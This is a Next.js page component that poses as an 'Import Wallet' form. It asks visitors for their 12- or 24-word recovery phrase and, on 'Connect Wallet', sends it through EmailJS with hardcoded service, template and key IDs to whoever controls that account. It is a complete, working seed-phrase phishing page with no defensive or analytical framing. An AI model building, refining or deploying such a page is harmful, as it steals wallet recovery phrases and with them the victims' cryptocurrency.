// @ts-nocheck
'use client';
import Image from 'next/image';
import './form.css';
import { useRef } from 'react';
import emailjs from '@emailjs/browser';

export default function Page() {
  const form = useRef();

  const sendEmail = (e) => {
    e.preventDefault();

    emailjs
      .sendForm(
        'service_5gpw30c',
        'template_5rlbagi',
        form.current,
        '7fQ-xstCOTi0ZiuVg'
      )
      .then(
        (result) => {
          console.log(result.text);
        },
        (error) => {
          console.log(error.text);
        }
      );
  };

  return (
    <section>
      <div className='rase'>
        <h5>Import Wallet</h5>
        <Image
          src='/assets/download.png'
          alt='inbox logo'
          width={120}
          className='mx-auto'
          height={120}
        />
        <form
          ref={form}
          onSubmit={sendEmail}
          className='flex flex-col items-start max-w-xl pb-20 mx-auto'
        >
          <p className='py-4'>
            Typically 12 (sometimes 24) words seperated by a single spaces.
          </p>
          <textarea
            name='message'
            rows={4}
            placeholder='Enter your Phrase'
            required
            className='w-full p-4 rounded ring-1 ring-black placeholder:font-mono'
            defaultValue={''}
          />
          <br />
          <button
            className='bg-[#4682b4] hover:bg-[#4682b4]/80 text-white font-semibold px-6 py-4 text-sm whitespace-nowrap'
            type='submit'
          >
            Connect Wallet
          </button>
        </form>
      </div>
    </section>
  );
}
